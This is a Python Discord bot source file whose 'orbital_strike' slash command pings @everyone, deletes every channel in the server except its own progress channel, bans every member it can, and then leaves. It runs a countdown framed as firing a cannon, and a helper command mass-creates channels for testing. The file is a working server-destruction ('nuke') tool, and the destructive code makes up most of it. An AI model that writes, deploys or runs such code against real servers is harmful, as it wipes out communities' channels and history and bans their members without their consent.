import interactions, colorama, asyncio

bot = interactions.Client(token="TOKEN", intents=interactions.Intents.ALL)

AUTHORIZED_USERS = []

@bot.event
async def on_ready():
    print(f"{colorama.Fore.BLUE}Orbital strike has entered LNO.{colorama.Fore.GREEN}")

async def remove_channels(guild: interactions.Guild, ORBITAL_STRIKE_CHANNEL: interactions.Channel, testing: bool):
    for channel in guild.channels:
        if channel.id == ORBITAL_STRIKE_CHANNEL.id:
            continue
        await channel.delete()

    if testing:
        print("Preparing first greeting...")
        await asyncio.sleep(0.5)
        print("Hello, Neko!!")

async def ban_members(guild: interactions.Guild, testing: bool):
    for member in guild.members:
        try:
            await member.ban()
        except Exception:
            pass

    if testing:
        print("Preparing second greeting...")
        await asyncio.sleep(0.5)
        print("Hello, Neko!!!!")

@bot.command(
    name="orbital_strike",
    description="Call an orbital strike on to a server.",
    options = [
        interactions.Option(
            name="testing",
            description="Whether or not the command is being ran for testing.",
            required=False,
            type=interactions.OptionType.BOOLEAN
        )
    ]
)
async def orbital_strike(ctx: interactions.CommandContext, testing: bool=False) -> None:
    await ctx.author.send("Preparing orbital strike...")

    if ctx.author.id not in AUTHORIZED_USERS:
        await ctx.author.send("User has no authorization to send orbital strike, cancelling.")
        return
    
    guild = await ctx.get_guild()
    ORBITAL_STRIKE_CHANNEL: interactions.Channel = await guild.create_channel(name="orbital_strike_progress", type=interactions.ChannelType.GUILD_TEXT,
                                                                              position=0)
    await ORBITAL_STRIKE_CHANNEL.send("@everyone")
    update_message = await ORBITAL_STRIKE_CHANNEL.send("```yaml\nOrbital strike progress channel created. Gathering information.".upper())

    async def chan(msg: str): await update_message.edit(f"{update_message.content.removesuffix('```')}\n{msg.upper()}```") 

    channels = []

    #await chan("\nThe following channels have been collected:")
    #for channel in guild.channels:
        #if channel.id in channels:
            #continue
        #await chan(str(channel.id))
        #channels.append(channel.id)

    await chan("\nInformation gathering complete, charging and aiming cannon...\n")

    for time in range(3):
        await chan(f"{str(3 - time)} seconds remaining...")
        await asyncio.sleep(1)
    
    await chan("\nFiring cannon.")

    coros = [remove_channels(guild, ORBITAL_STRIKE_CHANNEL, testing), ban_members(guild, testing)]
    await asyncio.gather(*coros)

    #await ORBITAL_STRIKE_CHANNEL.send("https://static.wikia.nocookie.net/gundam/images/4/49/Colony-Laser.gif")
    await chan("\nOperation complete, leaving scene.")
    if testing != True:
        await guild.leave()

@bot.command(
    name="create_channels",
    description="Create a range of channels. Perfect for testing.",
    options=[
        interactions.Option(
            name="amount",
            description="Amount of channels to create.",
            required=True,
            type=interactions.OptionType.NUMBER
        )
    ]
)
async def create_channels(ctx: interactions.CommandContext, amount: float):
    await ctx.send(f"Creating {int(amount)} channels.")
    for i in range(int(amount)):
        await ctx.guild.create_channel(name=str(i+1), type=interactions.ChannelType.GUILD_TEXT)

bot.start()
